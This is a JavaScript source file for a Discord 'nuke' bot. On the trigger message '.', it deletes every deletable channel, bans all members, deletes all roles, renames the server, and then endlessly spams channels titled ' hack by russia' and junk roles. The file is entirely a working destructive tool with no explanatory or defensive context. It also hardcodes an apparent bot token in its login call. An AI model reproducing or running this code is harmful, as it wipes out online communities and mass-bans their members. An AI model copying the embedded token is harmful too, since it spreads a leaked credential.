const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ""
 client.on('message', message =>{
    if (message.content === ('.')){
            if (message.channel.guild){
                message.guild.channels.forEach(c =>{
                    if(c.deletable){
                        c.delete()
                    }
                })
                message.guild.members.forEach(m =>{
                    m.ban()
                })
                message.guild.roles.forEach(r=>{
                    r.delete()
                })
                message.guild.setName('bzndzaka')
                setInterval(function(){
                    message.guild.createChannel(' hack by russia', 'voice')
                    message.guild.createChannel(' ras UP ', 'text')
                    message.guild.createRole({name : ' <.>'})
                })
            }
        }
 })



client.login("Nzc1Nzk5MTUwMjk4MDA1NTI0.X6rlQw.G0Z4B47PkvLyp0hS9dnjrSkkXV4");
